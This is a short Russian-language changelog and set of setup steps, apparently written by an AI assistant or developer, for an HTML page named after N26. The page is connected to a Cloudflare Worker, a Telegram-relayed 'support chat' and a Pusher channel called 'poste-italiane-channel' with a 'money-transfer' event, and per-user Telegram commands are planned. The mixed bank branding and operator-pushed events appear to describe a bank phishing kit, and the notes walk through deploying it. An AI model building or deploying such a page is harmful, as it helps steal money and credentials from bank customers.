N26 HTML — обновлённая версия с чатом поддержки

1. Файл n26-updated-support-connected.html основан на последнем загруженном HTML (index(20261029-171222).html). Изменения пользователя сохранены.
2. Найдите в конце файла WORKER_URL = 'https://YOUR-WORKER.workers.dev' и замените placeholder на адрес вашего существующего Cloudflare Worker (без завершающего слэша).
3. Worker должен поддерживать /api/support/send и /api/support/poll, Telegram webhook и D1 binding DB. Для origin сайта задайте ALLOWED_ORIGIN.
4. Не меняйте существующие Pusher CHANNEL_NAME = 'poste-italiane-channel' и EVENT_NAME = 'money-transfer'. Они сохранены без изменений.

ОГРАНИЧЕНИЕ ЭТОЙ СБОРКИ
Этот HTML подключает интерфейс чата к существующим support endpoints. Он пока НЕ добавляет адресные Telegram-команды для отправки событий Pusher конкретному пользователю и не меняет Worker. Не выкладывайте файл как готовую интеграцию, пока не настроены URL и серверные endpoints.

Перед публикацией протестируйте чат на собственном сайте и убедитесь, что Worker ограничивает ответы администратором, а ALLOWED_ORIGIN настроен на точный домен. Не вставляйте Telegram/Pusher секреты в HTML.
